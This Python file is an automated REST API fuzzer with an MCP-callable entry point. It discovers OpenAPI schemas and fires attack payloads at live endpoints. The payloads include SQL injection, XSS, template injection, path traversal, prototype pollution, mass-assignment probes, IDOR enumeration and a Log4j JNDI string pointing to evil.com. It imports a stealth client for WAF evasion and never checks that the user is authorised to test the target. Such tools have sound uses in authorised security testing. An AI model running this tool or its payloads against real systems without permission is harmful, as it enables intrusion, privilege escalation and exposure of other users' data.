#!/usr/bin/env python3
"""REST API Fuzzer - Schema-Aware

Advanced REST API testing with OpenAPI/Swagger schema support,
type-aware fuzzing, and intelligent payload generation.
"""

import json
import re
import time
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, safe_request, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)
    
    def safe_request(method, url, **kwargs):
        return requests.request(method, url, **kwargs)


# Type-specific fuzz payloads
TYPE_PAYLOADS = {
    "string": [
        "",                              # Empty
        "a" * 1000,                      # Long string
        "' OR '1'='1",                   # SQLi
        "<script>alert(1)</script>",     # XSS
        "{{7*7}}",                       # SSTI
        "${7*7}",                        # Template injection
        "../../../etc/passwd",           # Path traversal
        "${jndi:ldap://evil.com/a}",     # Log4j
        "admin",                         # Privilege escalation
        "null",                          # Null string
        "undefined",                     # Undefined
        "\x00",                          # Null byte
        "test\ninjection",               # CRLF
    ],
    "integer": [
        0,
        -1,
        1,
        2147483647,                      # Max int32
        -2147483648,                     # Min int32
        9999999999999,                   # Very large
        "1",                             # String instead of int
        "1.5",                           # Float as string
        "abc",                           # Invalid
        "1' OR '1'='1",                  # SQLi in numeric
        "1; DROP TABLE users",           # SQLi
    ],
    "boolean": [
        True,
        False,
        "true",
        "false",
        1,
        0,
        "yes",
        "no",
        None,
    ],
    "array": [
        [],                              # Empty array
        [1],                             # Single element
        [1, 2, 3] * 100,                 # Large array
        ["<script>alert(1)</script>"],   # XSS in array
        [{"__proto__": {"admin": True}}],  # Prototype pollution
        "not_an_array",                  # Type confusion
    ],
    "object": [
        {},                              # Empty object
        {"admin": True},                 # Privilege escalation
        {"role": "admin"},               # Role escalation
        {"is_admin": True},              # Admin flag
        {"__proto__": {"admin": True}},  # Prototype pollution
        {"constructor": {"prototype": {"admin": True}}},  # Prototype pollution
        "not_an_object",                 # Type confusion
    ],
    "email": [
        "",
        "test@test.com",
        "admin@admin.com",
        "a" * 100 + "@test.com",
        "test@test.com\nadmin@admin.com",  # CRLF
        "<script>@test.com",             # XSS attempt
    ],
    "uuid": [
        "00000000-0000-0000-0000-000000000000",  # Null UUID
        "00000000-0000-0000-0000-000000000001",  # Sequential
        "ffffffff-ffff-ffff-ffff-ffffffffffff",  # Max UUID
        "invalid-uuid",                  # Invalid
        "1",                             # Simple ID instead
    ],
}

# IDOR payload patterns for ID fields
IDOR_PATTERNS = [
    ("increment", lambda x: str(int(x) + 1) if x.isdigit() else None),
    ("decrement", lambda x: str(int(x) - 1) if x.isdigit() and int(x) > 0 else None),
    ("zero", lambda x: "0"),
    ("one", lambda x: "1"),
    ("large", lambda x: "999999"),
    ("negative", lambda x: "-1"),
]


def discover_openapi_schema(base_url: str, headers: Optional[Dict] = None) -> Optional[Dict]:
    """Discover and fetch OpenAPI/Swagger schema
    
    Args:
        base_url: Base URL of the API
        headers: Optional headers
        
    Returns:
        OpenAPI schema dict or None
    """
    common_paths = [
        "/openapi.json",
        "/swagger.json",
        "/api-docs",
        "/v2/api-docs",
        "/v3/api-docs",
        "/swagger/v1/swagger.json",
        "/api/swagger.json",
        "/api/openapi.json",
        "/.well-known/openapi.json",
        "/docs/openapi.json",
    ]
    
    for path in common_paths:
        try:
            url = urljoin(base_url, path)
            resp = safe_get(url, headers=headers or {}, timeout=10)
            
            if resp.status_code == 200:
                content_type = resp.headers.get("Content-Type", "")
                if "json" in content_type or path.endswith(".json"):
                    schema = resp.json()
                    # Validate it looks like OpenAPI
                    if "paths" in schema or "swagger" in schema or "openapi" in schema:
                        return {
                            "schema": schema,
                            "url": url,
                            "version": schema.get("openapi", schema.get("swagger", "unknown"))
                        }
        except Exception:
            continue
    
    return None


def parse_openapi_schema(schema: Dict) -> List[Dict[str, Any]]:
    """Parse OpenAPI schema into testable endpoints
    
    Args:
        schema: OpenAPI schema dict
        
    Returns:
        List of endpoint definitions with parameters
    """
    endpoints = []
    paths = schema.get("paths", {})
    
    for path, methods in paths.items():
        for method, details in methods.items():
            if method.lower() not in ["get", "post", "put", "patch", "delete"]:
                continue
            
            endpoint = {
                "path": path,
                "method": method.upper(),
                "summary": details.get("summary", ""),
                "operation_id": details.get("operationId", ""),
                "parameters": [],
                "request_body": None,
                "security": details.get("security", []),
            }
            
            # Parse path and query parameters
            for param in details.get("parameters", []):
                param_info = {
                    "name": param.get("name"),
                    "in": param.get("in"),  # path, query, header, cookie
                    "required": param.get("required", False),
                    "type": _get_param_type(param),
                    "schema": param.get("schema", {}),
                }
                endpoint["parameters"].append(param_info)
            
            # Parse request body (OpenAPI 3.x)
            if "requestBody" in details:
                content = details["requestBody"].get("content", {})
                for content_type, content_schema in content.items():
                    if "json" in content_type:
                        endpoint["request_body"] = {
                            "content_type": content_type,
                            "schema": content_schema.get("schema", {}),
                            "required": details["requestBody"].get("required", False),
                        }
                        break
            
            endpoints.append(endpoint)
    
    return endpoints


def _get_param_type(param: Dict) -> str:
    """Extract parameter type from OpenAPI parameter definition"""
    schema = param.get("schema", {})
    param_type = schema.get("type", param.get("type", "string"))
    
    # Handle special formats
    if schema.get("format") == "email":
        return "email"
    if schema.get("format") == "uuid":
        return "uuid"
    if param_type == "integer" or param_type == "number":
        return "integer"
    if param_type == "boolean":
        return "boolean"
    if param_type == "array":
        return "array"
    if param_type == "object":
        return "object"
    
    return "string"


def generate_payloads_for_type(param_type: str) -> List[Any]:
    """Generate fuzz payloads based on parameter type"""
    return TYPE_PAYLOADS.get(param_type, TYPE_PAYLOADS["string"])


def fuzz_endpoint(
    base_url: str,
    endpoint: Dict[str, Any],
    headers: Optional[Dict] = None,
    auth_token: Optional[str] = None,
    rate_limit: float = 0.5
) -> Dict[str, Any]:
    """Fuzz a single API endpoint with type-aware payloads
    
    Args:
        base_url: Base URL of the API
        endpoint: Endpoint definition from parse_openapi_schema
        headers: Optional headers
        auth_token: Optional Bearer token
        rate_limit: Delay between requests
        
    Returns:
        Fuzzing results
    """
    results = {
        "endpoint": endpoint["path"],
        "method": endpoint["method"],
        "vulnerable": False,
        "findings": [],
        "tests_run": 0,
    }
    
    # Build headers
    req_headers = headers.copy() if headers else {}
    if auth_token:
        req_headers["Authorization"] = f"Bearer {auth_token}"
    req_headers.setdefault("Content-Type", "application/json")
    
    # Build base URL for endpoint
    url = urljoin(base_url, endpoint["path"])
    
    # Test each parameter
    for param in endpoint["parameters"]:
        param_name = param["name"]
        param_type = param["type"]
        param_in = param["in"]
        
        payloads = generate_payloads_for_type(param_type)
        
        for payload in payloads:
            results["tests_run"] += 1
            time.sleep(rate_limit)
            
            try:
                # Build request based on parameter location
                if param_in == "path":
                    test_url = url.replace(f"{{{param_name}}}", str(payload))
                    resp = safe_request(endpoint["method"], test_url, headers=req_headers, timeout=10)
                elif param_in == "query":
                    resp = safe_request(
                        endpoint["method"], url,
                        params={param_name: payload},
                        headers=req_headers,
                        timeout=10
                    )
                elif param_in == "header":
                    test_headers = req_headers.copy()
                    test_headers[param_name] = str(payload)
                    resp = safe_request(endpoint["method"], url, headers=test_headers, timeout=10)
                else:
                    continue
                
                # Analyze response
                finding = _analyze_response(resp, param_name, payload, param_type)
                if finding:
                    finding["parameter_location"] = param_in
                    results["findings"].append(finding)
                    results["vulnerable"] = True
                    
            except Exception as e:
                continue
    
    # Test request body if present
    if endpoint["request_body"]:
        body_schema = endpoint["request_body"].get("schema", {})
        body_findings = _fuzz_request_body(
            base_url, url, endpoint["method"],
            body_schema, req_headers, rate_limit
        )
        results["findings"].extend(body_findings)
        if body_findings:
            results["vulnerable"] = True
    
    return results


def _analyze_response(resp, param_name: str, payload: Any, param_type: str) -> Optional[Dict]:
    """Analyze response for vulnerabilities"""
    payload_str = str(payload)
    
    # Check for reflected input (potential XSS/injection)
    if payload_str in resp.text and len(payload_str) > 3:
        return {
            "type": "reflected_input",
            "parameter": param_name,
            "payload": payload_str,
            "status_code": resp.status_code,
            "confidence": "medium",
        }
    
    # Check for SQL errors
    sql_errors = ["sql", "syntax error", "mysql", "postgresql", "sqlite", "oracle", "mssql"]
    if any(err in resp.text.lower() for err in sql_errors):
        return {
            "type": "potential_sqli",
            "parameter": param_name,
            "payload": payload_str,
            "status_code": resp.status_code,
            "confidence": "high",
        }
    
    # Check for SSTI (49 = 7*7)
    if "49" in resp.text and ("{{7*7}}" in payload_str or "${7*7}" in payload_str):
        return {
            "type": "potential_ssti",
            "parameter": param_name,
            "payload": payload_str,
            "status_code": resp.status_code,
            "confidence": "high",
        }
    
    # Check for path traversal
    if "root:" in resp.text or "\\windows\\" in resp.text.lower():
        return {
            "type": "path_traversal",
            "parameter": param_name,
            "payload": payload_str,
            "status_code": resp.status_code,
            "confidence": "high",
        }
    
    # Check for verbose errors
    error_patterns = ["traceback", "exception", "stack trace", "debug", "error at line"]
    if any(pattern in resp.text.lower() for pattern in error_patterns):
        return {
            "type": "verbose_error",
            "parameter": param_name,
            "payload": payload_str,
            "status_code": resp.status_code,
            "confidence": "low",
        }
    
    # Check for type confusion (200 on invalid type)
    if resp.status_code == 200 and param_type in ["integer", "boolean"]:
        if isinstance(payload, str) and not payload.isdigit():
            return {
                "type": "type_confusion",
                "parameter": param_name,
                "payload": payload_str,
                "expected_type": param_type,
                "status_code": resp.status_code,
                "confidence": "low",
            }
    
    return None


def _fuzz_request_body(
    base_url: str,
    url: str,
    method: str,
    schema: Dict,
    headers: Dict,
    rate_limit: float
) -> List[Dict]:
    """Fuzz JSON request body based on schema"""
    findings = []
    
    properties = schema.get("properties", {})
    
    # Test each property
    for prop_name, prop_schema in properties.items():
        prop_type = prop_schema.get("type", "string")
        payloads = generate_payloads_for_type(prop_type)
        
        for payload in payloads[:5]:  # Limit body fuzzing
            time.sleep(rate_limit)
            
            try:
                body = {prop_name: payload}
                resp = safe_request(
                    method, url,
                    json=body,
                    headers=headers,
                    timeout=10
                )
                
                finding = _analyze_response(resp, prop_name, payload, prop_type)
                if finding:
                    finding["parameter_location"] = "body"
                    findings.append(finding)
                    
            except Exception:
                continue
    
    # Test mass assignment
    mass_assign_payloads = [
        {"admin": True},
        {"role": "admin"},
        {"is_admin": True},
        {"permissions": ["admin"]},
        {"__proto__": {"admin": True}},
    ]
    
    for payload in mass_assign_payloads:
        time.sleep(rate_limit)
        try:
            resp = safe_request(method, url, json=payload, headers=headers, timeout=10)
            if resp.status_code in [200, 201]:
                findings.append({
                    "type": "potential_mass_assignment",
                    "payload": payload,
                    "status_code": resp.status_code,
                    "confidence": "medium",
                })
        except Exception:
            continue
    
    return findings


def test_idor_on_endpoints(
    base_url: str,
    endpoints: List[Dict],
    headers: Optional[Dict] = None,
    auth_token: Optional[str] = None,
    rate_limit: float = 0.5
) -> List[Dict]:
    """Test endpoints for IDOR vulnerabilities
    
    Args:
        base_url: Base URL of the API
        endpoints: List of endpoint definitions
        headers: Optional headers
        auth_token: Optional Bearer token
        rate_limit: Delay between requests
        
    Returns:
        List of IDOR findings
    """
    findings = []
    
    req_headers = headers.copy() if headers else {}
    if auth_token:
        req_headers["Authorization"] = f"Bearer {auth_token}"
    
    # Find endpoints with ID parameters
    id_patterns = re.compile(r'\{(.*id.*|.*Id.*)\}', re.IGNORECASE)
    
    for endpoint in endpoints:
        path = endpoint["path"]
        
        # Check for ID in path
        match = id_patterns.search(path)
        if not match:
            continue
        
        param_name = match.group(1)
        
        # Test with different ID values
        for pattern_name, transform in IDOR_PATTERNS:
            # Start with a known valid ID (1)
            test_id = transform("1")
            if test_id is None:
                continue
            
            test_url = urljoin(base_url, path.replace(f"{{{param_name}}}", test_id))
            
            time.sleep(rate_limit)
            
            try:
                resp = safe_request(
                    endpoint["method"],
                    test_url,
                    headers=req_headers,
                    timeout=10
                )
                
                if resp.status_code == 200:
                    # Check if response contains data
                    try:
                        data = resp.json()
                        # Operator precedence fix: properly check for valid data
                        is_dict_with_id = isinstance(data, dict) and data.get("id")
                        is_non_empty_list = isinstance(data, list) and len(data) > 0
                        if data and (is_dict_with_id or is_non_empty_list):
                            findings.append({
                                "type": "potential_idor",
                                "endpoint": endpoint["path"],
                                "method": endpoint["method"],
                                "test_url": test_url,
                                "test_pattern": pattern_name,
                                "status_code": resp.status_code,
                                "confidence": "medium",
                                "note": f"Accessible with {param_name}={test_id}",
                            })
                    except Exception:
                        pass
                        
            except Exception:
                continue
    
    return findings


def schema_aware_fuzz(
    target_url: str,
    headers: Optional[Dict] = None,
    auth_token: Optional[str] = None,
    rate_limit: float = 0.5,
    max_endpoints: int = 20
) -> Dict[str, Any]:
    """Run schema-aware API fuzzing
    
    Args:
        target_url: Target API base URL
        headers: Optional headers
        auth_token: Optional Bearer token
        rate_limit: Delay between requests
        max_endpoints: Maximum endpoints to test
        
    Returns:
        Complete fuzzing results
    """
    results = {
        "target": target_url,
        "schema_discovered": False,
        "schema_url": None,
        "endpoints_tested": 0,
        "vulnerabilities_found": 0,
        "findings": [],
        "idor_findings": [],
    }
    
    # Try to discover OpenAPI schema
    schema_info = discover_openapi_schema(target_url, headers)
    
    if schema_info:
        results["schema_discovered"] = True
        results["schema_url"] = schema_info["url"]
        results["schema_version"] = schema_info["version"]
        
        # Parse endpoints
        endpoints = parse_openapi_schema(schema_info["schema"])
        endpoints = endpoints[:max_endpoints]
        
        # Fuzz each endpoint
        for endpoint in endpoints:
            endpoint_results = fuzz_endpoint(
                target_url, endpoint, headers, auth_token, rate_limit
            )
            results["endpoints_tested"] += 1
            
            if endpoint_results["vulnerable"]:
                results["vulnerabilities_found"] += len(endpoint_results["findings"])
                results["findings"].extend(endpoint_results["findings"])
        
        # Test for IDOR
        idor_findings = test_idor_on_endpoints(
            target_url, endpoints, headers, auth_token, rate_limit
        )
        results["idor_findings"] = idor_findings
        results["vulnerabilities_found"] += len(idor_findings)
        
    else:
        # Fallback to basic discovery
        results["note"] = "No OpenAPI schema found, using basic fuzzing"
        
        # Try common API paths
        common_paths = [
            "/api/users", "/api/user", "/api/v1/users",
            "/api/accounts", "/api/profile", "/api/data",
        ]
        
        req_headers = headers.copy() if headers else {}
        if auth_token:
            req_headers["Authorization"] = f"Bearer {auth_token}"
        
        for path in common_paths:
            url = urljoin(target_url, path)
            try:
                resp = safe_get(url, headers=req_headers, timeout=10)
                if resp.status_code == 200:
                    results["findings"].append({
                        "type": "discovered_endpoint",
                        "url": url,
                        "status_code": resp.status_code,
                    })
            except Exception:
                continue
    
    return results


def validate_api_security(discovery_data: Dict[str, Any]) -> Dict[str, Any]:
    """MCP-compatible validation function
    
    Args:
        discovery_data: Discovery data from MCP
        
    Returns:
        Validation results
    """
    target_url = discovery_data.get("target") or discovery_data.get("url")
    headers = discovery_data.get("headers")
    auth_token = discovery_data.get("auth_token")
    
    if not target_url:
        return {"error": "No target URL provided", "vulnerable": False}
    
    return schema_aware_fuzz(
        target_url,
        headers=headers,
        auth_token=auth_token,
        rate_limit=0.5,
        max_endpoints=20
    )


# Legacy functions for backward compatibility
def discover_parameters(endpoint: str, method: str = "GET", headers: Optional[Dict] = None) -> List[str]:
    """Discover API parameters from endpoint (legacy)"""
    params = []
    common_params = ["id", "user_id", "email", "username", "token", "api_key", "limit", "offset", "sort"]
    
    if "?" in endpoint:
        query_string = endpoint.split("?")[1]
        params.extend([p.split("=")[0] for p in query_string.split("&")])
    
    params.extend(common_params)
    return list(set(params))


def fuzz_parameters(endpoint: str, parameters: List[str], headers: Optional[Dict] = None) -> Dict[str, Any]:
    """Fuzz API parameters (legacy)"""
    results = {"vulnerable": False, "findings": []}
    
    payloads = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
    ]
    
    for param in parameters:
        for payload in payloads:
            try:
                resp = safe_get(endpoint, params={param: payload}, headers=headers or {}, timeout=10)
                if payload in resp.text:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "parameter": param,
                        "payload": payload,
                        "type": "reflected_input",
                        "status_code": resp.status_code
                    })
            except Exception:
                continue
    
    return results


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python rest_api_fuzzer.py <target_url> [auth_token]")
        sys.exit(1)
    
    target = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    print(f"[*] Testing API: {target}")
    results = schema_aware_fuzz(target, auth_token=token)
    
    print(f"\n[*] Schema discovered: {results['schema_discovered']}")
    print(f"[*] Endpoints tested: {results['endpoints_tested']}")
    print(f"[*] Vulnerabilities found: {results['vulnerabilities_found']}")
    
    if results["findings"]:
        print("\n[!] Findings:")
        for finding in results["findings"]:
            print(f"  - {finding['type']}: {finding.get('parameter', 'N/A')} ({finding.get('confidence', 'N/A')})")
    
    if results["idor_findings"]:
        print("\n[!] IDOR Findings:")
        for finding in results["idor_findings"]:
            print(f"  - {finding['endpoint']}: {finding['note']}")
